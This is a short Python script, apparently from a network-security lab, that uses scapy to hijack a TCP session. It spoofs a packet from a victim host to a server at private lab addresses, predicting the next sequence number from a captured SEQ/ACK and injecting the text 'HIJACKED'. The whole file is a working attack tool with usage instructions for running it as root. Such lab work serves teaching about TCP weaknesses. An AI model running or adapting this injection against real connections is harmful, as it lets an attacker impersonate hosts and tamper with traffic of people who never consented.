#!/usr/bin/env python3
"""Inject a spoofed data segment into the victim -> server TCP session by
predicting the next sequence number.

Read the current SEQ / ACK / source port from the capture first:

    sudo tcpdump -nn -r ~/session.pcap

Then run on the attacker (as root):

    sudo python3 pred-hijack.py <seq> <ack> <sport> <payload_len>

<seq> is the last sequence number seen from the victim and <payload_len> the
number of bytes the victim sent at that point.
"""

import sys

from scapy.all import IP, TCP, send

VICTIM = '172.21.0.2'
SERVER = '172.21.0.3'
DPORT = 9999
PAYLOAD = b'HIJACKED\n'


def main():
    if len(sys.argv) != 5:
        print('Usage: sudo python3 pred-hijack.py <seq> <ack> <sport> <payload_len>')
        sys.exit(2)
    seq, ack, sport, plen = (int(x) for x in sys.argv[1:5])
    next_seq = seq + plen
    pkt = (IP(src=VICTIM, dst=SERVER)
           / TCP(sport=sport, dport=DPORT, flags='PA', seq=next_seq, ack=ack)
           / PAYLOAD)
    send(pkt, verbose=False)
    print('Injected HIJACKED: seq=%d ack=%d sport=%d len=%d'
          % (next_seq, ack, sport, len(PAYLOAD)))


if __name__ == '__main__':
    main()
